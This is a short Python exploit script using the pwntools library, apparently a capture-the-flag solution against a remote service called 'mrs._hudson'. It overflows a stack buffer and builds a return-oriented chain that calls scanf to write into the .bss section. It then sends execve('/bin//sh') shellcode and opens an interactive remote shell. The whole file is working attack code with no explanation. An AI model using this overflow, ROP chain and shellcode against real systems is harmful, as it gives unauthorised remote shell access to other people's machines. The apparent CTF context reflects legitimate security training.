from pwn import *

# r = process("./mrs._hudson")
r = remote("178.62.249.106", 8642)

payload = "A" * 0x78
payload += p64(0x00000000004006f1)	# pop rsi r15
payload += p64(0x0000000000601040)	# bss
payload += 'AAAAAAAA'
payload += p64(0x00000000004006f3)	# pop rdi
payload += p64(0x000000000040072B)	# %s
payload += p64(0x0000000000400526)	# scanf
payload += p64(0x0000000000601040)

r.sendlineafter("Let's go back to 2000.\n", payload)
r.sendline("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

r.interactive()
